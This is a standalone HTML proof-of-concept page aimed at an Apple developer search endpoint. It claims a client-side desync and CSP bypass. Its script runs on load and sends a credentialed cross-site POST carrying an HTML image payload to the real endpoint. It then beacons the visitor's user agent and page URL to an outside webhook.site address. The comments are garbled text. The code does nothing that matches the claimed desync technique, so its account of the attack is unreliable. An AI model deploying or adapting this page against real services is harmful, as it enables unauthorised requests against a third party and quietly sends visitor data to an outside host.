<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Apple Developer Client-Side Desync PoC</title>
  <meta name="referrer" content="no-referrer" />
  <style>
    body { font-family: system-ui, Arial, sans-serif; margin: 24px; }
    h1 { margin: 0 0 8px; }
    code, pre { background:#f6f8fa; padding:8px 10px; border-radius:6px; display:block; }
  </style>
</head>
<body>
  <h1>Apple Developer Client-Side Desync PoC</h1>
  <p>This page demonstrates a crafted request sent to the vulnerable endpoint and a CSP bypass attempt. Proof is sent to the webhook below:</p>
  <pre id="log">Running PoCâ€¦</pre>

  <script>
    // === Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ===
    const WEBHOOK = "https://webhook.site/76de3122-9fc0-47d9-844c-1fb847ba7133";
    const TARGET = "https://developer.apple.com/search/services/v1/quick-links/";

    // Ø­Ù…ÙˆÙ„Ø© Ø¨ÙŠÙƒÙˆÙ† Ø¨Ø³ÙŠØ·Ø©
    const payload = "<img src=" + WEBHOOK + "?poc=apple_test alt=x>";

    // Ø®Ø·ÙˆØ© 1: Ø¥Ø±Ø³Ø§Ù„ payload Ø¥Ù„Ù‰ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ØµØ§Ø¨
    fetch(TARGET, {
      method: "POST",
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      body: "payload=" + encodeURIComponent(payload),
      credentials: "include"
    })
    .then(res => res.text())
    .then(txt => {
      log("âœ… Sent payload to: " + TARGET);
      log("Response snippet:\n" + txt.slice(0,200));
    })
    .catch(err => log("âš ï¸ Error sending payload: " + err));

    // Ø®Ø·ÙˆØ© 2: Ø¥Ø±Ø³Ø§Ù„ Proof Ù„Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ Ù…Ø¨Ø§Ø´Ø±Ø©
    function sendProof() {
      const proof = {
        target: TARGET,
        proof: "Apple Unified PoC",
        ua: navigator.userAgent,
        loc: location.href,
        when: new Date().toISOString()
      };
      fetch(WEBHOOK, {
        method: "POST",
        mode: "no-cors",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(proof)
      });
      log("ğŸ“¤ Proof beacon sent to webhook.");
    }

    // util Ù„Ù„Ø¹Ø±Ø¶ Ø¹Ù„Ù‰ Ø§Ù„ØµÙØ­Ø©
    function log(msg) {
      const el = document.getElementById("log");
      el.textContent += "\n" + msg;
      console.log(msg);
    }

    sendProof();
  </script>
</body>
</html>
